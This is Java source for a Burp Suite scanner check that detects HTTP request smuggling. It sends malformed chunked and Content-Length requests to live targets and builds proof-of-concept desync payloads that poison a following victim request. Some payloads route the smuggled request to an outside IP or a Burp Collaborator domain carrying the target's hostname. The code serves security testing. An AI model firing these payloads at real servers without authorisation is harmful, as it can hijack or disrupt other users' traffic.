package burp;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.util.List;
import java.util.zip.GZIPOutputStream;

public class ChunkContentScan extends SmuggleScanBox implements IScannerCheck  {

    ChunkContentScan(String name) {
        super(name);
    }

    boolean sendPoc(byte[] base, IHttpService service) {
        boolean gpoc = false;
        boolean cpoc2 = false;
        boolean cpoc3 = false;

        if (Utilities.globalSettings.getBoolean("poc: G")) {
            gpoc = prepPoc(base, service, "G", "G");
        }
        //boolean cpoc = sendPoc(base, service,"GET / HTTP/1.1\r\nHost: "+service.getHost()+".z88m811soo7x6fxuo08vu4wd94fw3l.burpcollaborator.net\r\n\r\n");
        //boolean cpoc = sendPoc(base, service, "collab", "GET /?x=z88m811soo7x6fxuo08vu4wd94fw3l/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\n\r\n");
        if (Utilities.globalSettings.getBoolean("poc: headerConcat")) {
            cpoc2 = prepPoc(base, service, "headerConcat", "GET /?x=exfvn9ifwkqy1bknteg8zcwhm8s2gr/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\nFoo: x");
        }
        if (Utilities.globalSettings.getBoolean("poc: bodyConcat")) {
            cpoc3 = prepPoc(base, service, "bodyConcat", "POST /?x=exfvn9ifwkqy1bknteg8zcwhm8s2gr/"+service.getHost()+" HTTP/1.1\r\nHost: 52.16.21.24\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 8\r\n\r\nfoo=");
        }
        if (Utilities.globalSettings.getBoolean("poc: collab")) {
            prepPoc(base, service, "collab", "GET / HTTP/1.1\r\nHost: "+service.getHost()+".exfvn9ifwkqy1bknteg8zcwhm8s2gr.burpcollaborator.net\r\n\r\n");
        }
        if (Utilities.globalSettings.getBoolean("poc: collab-header")) {
            prepPoc(base, service, "collab-header", "GET / HTTP/1.1\r\nHost: "+service.getHost()+".exfvn9ifwkqy1bknteg8zcwhm8s2gr.burpcollaborator.net\r\nX-Foo: X");
        }

        return gpoc || cpoc2 || cpoc3;
    }

    class DualChunkCL {
        String getAttack(byte[] base, String inject) {
            byte[] prep = Utilities.setHeader(base, "Connection", "keep-alive");
            prep = bypassContentLengthFix(makeChunked(prep, inject.length(), 0));
            return Utilities.helpers.bytesToString(prep)+inject;
        }
    }

    class DualChunkTE {
        String getAttack(byte[] base, String inject) {
            try {
                byte[] initial = Utilities.setHeader(base, "Connection", "keep-alive");
                ByteArrayOutputStream attackStream = new ByteArrayOutputStream();
                attackStream.write(initial);
                attackStream.write(inject.getBytes());

                byte[] attack = makeChunked(attackStream.toByteArray(), 0, 0);
                String attackString = Utilities.helpers.bytesToString(attack);
                int CL = attackString.lastIndexOf(inject) - Utilities.getBodyStart(attack);
                attack = Utilities.setHeader(attack, "Content-Length", String.valueOf(CL));

                attack = bypassContentLengthFix(attack);
                Utils.out(Utilities.helpers.bytesToString(attack));
                return Utilities.helpers.bytesToString(attack);
            } catch (IOException e) {
                return null;
            }
        }
    }

    boolean prepPoc(byte[] base, IHttpService service, String name, String inject) {
        String setupAttack = new DualChunkCL().getAttack(base, inject);
        //setupAttack = new DualChunkTE().getAttack(base, inject);
        byte[] victim = makeChunked(base, 0, 0);
        return sendPoc(name, setupAttack, victim, service);
    }



    byte[] bypassContentLengthFix(byte[] req) {
        return Utilities.replace(req, "Content-Length: ".getBytes(), "Content-length: ".getBytes());
    }

    public List<IScanIssue> doScan(byte[] original, IHttpService service) {
        if (Utilities.globalSettings.getBoolean("avoid rescanning vulnerable hosts") && BurpExtender.hostsToSkip.containsKey(service.getHost())) {
            return null;
        }

        if (original[0] == 'G') {
            original = Utilities.helpers.toggleRequestMethod(original);
        }

        original = Utilities.addOrReplaceHeader(original, "Transfer-Encoding", "foo");
        original = Utilities.setHeader(original, "Connection", "close");

        byte[] baseReq = makeChunked(original, 0, 0);
        Resp syncedResp = request(service, baseReq);
        if (syncedResp.timedOut()) {
            Utilities.log("Timeout on first request. Aborting.");
            return null;
        }

        Resp suggestedProbe = buildPoc(original, service);

        if (Utilities.globalSettings.getBoolean("try chunk-truncate")) {
            byte[] reverseLength = makeChunked(original, -1, 0); //Utilities.setHeader(baseReq, "Content-Length", "4");
            Resp truncatedChunk = request(service, reverseLength);
            if (truncatedChunk.timedOut()) {

                if (request(service, baseReq).timedOut()) {
                    return null;
                }

                Utilities.log("Reporting reverse timeout technique worked");
                String title = "Req smuggling: chunk truncate";
                if (!sendPoc(original, service)) {
                    title += " unconfirmed";
                }
                report(title, "status:timeout", syncedResp, truncatedChunk, suggestedProbe);
                return null;
            } else {
                byte[] dualChunkTruncate = Utilities.addOrReplaceHeader(reverseLength, "Transfer-encoding", "cow");
                Resp truncatedDualChunk = request(service, dualChunkTruncate);
                if (truncatedDualChunk.timedOut()) {

                    if (request(service, baseReq).timedOut()) {
                        return null;
                    }

                    Utilities.log("Reverse timeout technique with dual TE header worked");
                    String title = "Req smuggling: dual chunk truncate";
                    if (!sendPoc(Utilities.addOrReplaceHeader(original, "Transfer-encoding", "cow"), service)) {
                        title += " unconfirmed";
                    }
                    report(title, "status:timeout", syncedResp, truncatedDualChunk, suggestedProbe);
                    return null;
                }
            }
        }

        if (Utilities.globalSettings.getBoolean("try timeout-diff")) {

            // if we get to here, either they're secure or the frontend uses chunked
            byte[] overlongLength = makeChunked(original, 1, 0); //Utilities.setHeader(baseReq, "Content-Length", "6");
            Resp overlongLengthResp = request(service, overlongLength);
            short overlongLengthCode = 0;
            if (!overlongLengthResp.timedOut()) {
                overlongLengthCode = overlongLengthResp.getInfo().getStatusCode();
            }
            if (overlongLengthCode == syncedResp.getInfo().getStatusCode()) {
                Utilities.log("Overlong content length didn't cause a timeout or code-change. Aborting.");
                return null;
            }

            byte[] invalidChunk = Utilities.setBody(baseReq, "Z\r\n\r\n");
            invalidChunk = Utilities.setHeader(invalidChunk, "Content-Length", "5");
            Resp badChunkResp = request(service, invalidChunk);
            if (badChunkResp.timedOut()) {
                Utilities.log("Bad chunk attack timed out. Aborting.");
                return null;
            }

            if (badChunkResp.getStatus() == syncedResp.getStatus()) {
                Utilities.log("Invalid chunk probe didn't do anything. Attempting overlong chunk timeout instead.");

                byte[] overlongChunk = makeChunked(original, 0, 1); //Utilities.setBody(baseReq, "1\r\n\r\n");
                Resp overlongChunkResp = request(service, overlongChunk);

                short overlongChunkCode = overlongChunkResp.getStatus();

                if (overlongChunkCode == syncedResp.getStatus() || overlongChunkCode == overlongLengthCode) {
                    Utilities.log("Invalid chunk and overlong chunk both had no effect. Aborting.");
                    return null;
                }

                badChunkResp = overlongChunkResp;
            }

            String title = "Req smuggling: overlong diff";
            if (!sendPoc(original, service)) {
                title += " unconfirmed";
            }
            report(title, "Status:BadChunkDetection:BadLengthDetected", syncedResp, badChunkResp, overlongLengthResp, suggestedProbe);
        }

        return null;
    }
}

